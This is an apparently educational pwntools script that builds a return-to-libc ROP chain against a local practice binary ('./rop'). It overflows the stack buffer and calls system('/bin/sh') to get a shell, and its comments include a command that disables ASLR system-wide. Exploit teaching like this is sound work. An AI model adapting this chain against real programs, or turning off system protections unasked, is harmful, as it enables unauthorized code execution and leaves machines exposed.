# FIRST run:
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# This disables another protection we wont be covering.

# To re-enable afterwards run:
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space


#Import the pwntools library
from pwn import *

#Set the terminal for pwntools. Only necessary if gdb.attach is creating a new terminal
#You can find your terminal via `env | grep 'TERM'`
context.terminal = ["urxvt", "-e", "sh", "-c"]

#Start up the target program
target = process("./rop")

#Load your local 'libc'
#You can find its path by running `ldd ./rop`, which will list the libraries used by the rop binary
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7dd5000

#Get the address of the `pop rdi ; ret` gadget
#This will vary between libc versions. 
#Run `ROPgadget --binary [libc_path]` to get the rop gadgets for yours
p_rdi = libc.address + 0x23796

#Attach gdb to the target process if needed. Useful for debugging
#gdb.attach(target)

#Setup buffer.
# 0x40 bytes local stack space
# 0x8 bytes overwriting saved rbp
# Then rop chain
buf = b"A"*0x48

# Ppo the address of "/bin/sh" into rdi
buf += p64(p_rdi)
buf += p64(next(libc.search(b"/bin/sh\x00")))

# Call system("/bin/sh")
buf += p64(libc.symbols["system"])

#Send our buffer to the program
target.sendline(buf)

#Go into interactive mode so we can run commands
target.interactive()
